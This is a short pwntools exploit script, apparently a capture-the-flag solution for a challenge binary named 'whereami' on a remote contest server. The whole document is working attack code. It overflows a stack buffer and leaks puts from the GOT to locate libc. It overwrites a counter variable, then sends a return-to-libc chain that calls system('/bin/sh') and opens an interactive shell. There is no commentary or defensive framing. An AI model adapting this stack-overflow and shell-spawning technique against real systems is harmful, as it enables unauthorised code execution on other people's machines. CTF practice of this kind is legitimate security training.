from pwn import *

p = remote('challs.actf.co', 31222)
# p = remote('localhost', 7777)
e = ELF('./whereami')
libc = ELF('./libc.so.6')

pop_rdi = 0x401303

payload = b'A'*0x48
payload += p64(pop_rdi)
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(pop_rdi)
payload += p64(e.symbols['counter'])
payload += p64(e.plt['gets'])
payload += p64(pop_rdi+1)
payload += p64(e.symbols['main'])
p.sendlineafter(b'? ', payload)

p.recvline()
libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - libc.symbols['puts']
log.info(hex(libc.address))

p.sendline(b'\x00')

payload = b'A'*0x48
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])
p.sendline(payload)
p.interactive()
